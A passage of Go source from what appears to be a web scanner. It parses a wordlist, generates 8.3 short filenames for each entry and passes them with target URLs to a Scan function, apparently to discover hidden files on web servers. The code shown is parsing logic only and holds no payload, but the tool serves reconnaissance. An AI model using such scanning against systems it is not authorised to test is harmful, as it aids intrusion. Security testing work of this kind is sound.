			// Split the line and add the word
			c := strings.Split(line, "\t")
			f, e, f83, e83 := c[3], c[4], c[1], c[2]
			if len(e) > 0 {
				e = "." + e
			}
			wc.wordlist = append(wc.wordlist, wordlistRecord{c[0], f, e, f83, e83})

		} else {

			// Split the line into file and extension and generate an 8.3 version
			var r wordlistRecord
			if p := strings.LastIndex(line, "."); p > 0 && line[0] != '.' {
				f, e := line[:p], line[p:]
				_, f83, e83 := shortutil.Gen8dot3(f, e)
				r = wordlistRecord{"", f, e, f83, e83}
			} else {
				_, f83, _ := shortutil.Gen8dot3(line, "")
				r = wordlistRecord{"", line, "", f83, ""}
			}
			wc.wordlist = append(wc.wordlist, r)

		}

		// Next
		n += 1

	}

	// Let's go!
	Scan(args.Urls, hc, st, wc, mk)

}
